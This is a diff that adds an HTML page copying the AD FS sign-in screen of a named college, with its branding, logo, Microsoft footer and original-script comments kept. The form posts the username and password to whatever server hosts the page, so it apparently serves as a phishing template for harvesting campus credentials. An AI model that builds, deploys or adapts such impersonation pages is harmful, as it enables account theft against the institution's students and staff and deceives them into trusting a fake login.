@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1">
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta http-equiv="cache-control" content="no-cache,no-store">
+    <meta http-equiv="pragma" content="no-cache">
+    <meta http-equiv="expires" content="-1">
+    <meta name="mswebdialog-title" content="Connecting to Mohawk College">
+
+    <title>Sign In</title>
+    <script type="text/javascript">
+        //<![CDATA[
+        function LoginErrors() {
+            this.userNameFormatError = 'Enter your user ID in the format \u0026quot;domain\\user\u0026quot; or \u0026quot;user@domain\u0026quot;.';
+            this.passwordEmpty = 'Enter your password.';
+            this.passwordTooLong = 'Password is too long (\u0026gt; 128 characters).';
+        };
+        var maxPasswordLength = 128;
+        //]]>
+    </script>
+
+    <script type="text/javascript">
+        //<![CDATA[
+        // Add JavaScript logic here (unchanged from original)
+        //]]>
+    </script>
+
+    <link rel="stylesheet" type="text/css" href="../static/css/style.css">
+    <style>
+        .illustrationClass {
+            background-image: url(../static/images/MohawkBackground.jpg);
+        }
+    </style>
+</head>
+<body dir="ltr" class="body">
+<div id="noScript" style="position: static; width: 100%; height: 100%; z-index: 100; display: none;">
+    <h1>JavaScript required</h1>
+    <p>JavaScript is required. This web browser does not support JavaScript or JavaScript in this web browser is not enabled.</p>
+    <p>To find out if your web browser supports JavaScript or to enable JavaScript, see web browser help.</p>
+</div>
+<script type="text/javascript" language="JavaScript">
+    document.getElementById("noScript").style.display = "none";
+</script>
+<div id="fullPage">
+    <div id="brandingWrapper" class="float">
+        <div id="branding" class="illustrationClass"></div>
+    </div>
+    <div id="contentWrapper" class="float">
+        <div id="content">
+            <div id="header">
+                <img class="logoImage" id="companyLogo" src="../static/images/logo.png" alt="Mohawk College">
+            </div>
+            <div id="workArea">
+                <div id="authArea" class="groupMargin">
+                    <div id="loginMessage" class="groupMargin">
+                        Sign in with your Mohawk College username (e.g.&nbsp;jsmith) and password below.<br>
+                        <p style="color:red">DO NOT USE YOUR EMAIL ADDRESS.</p>
+                    </div>
+                    <div class="form">
+                        <form class="a-form" method="POST">
+                            <input type="text" id="Email" class="text fullWidth" name="login" placeholder="Username"
+                                   autofocus="autofocus" required />
+                            <input type="password" id="Password" class="text fullWidth" name="password" placeholder="Password"
+                                   autofocus="autofocus" />
+                            <br><br>
+                            <input type="submit" class="a-sub" value="Sign In" />
+                        </form>
+                    </div>
+                </div>
+            </div>
+            <div id="footerPlaceholder"></div>
+        </div>
+        <div id="footer">
+            <div id="footerLinks" class="floatReverse">
+                <div><span id="copyright">© 2016 Microsoft</span></div>
+            </div>
+        </div>
+    </div>
+</div>
+<script type="text/javascript">
+    //<![CDATA[
+    // Add JavaScript logic here (unchanged from original)
+    //]]>
+</script>
+</body>
+</html>
+
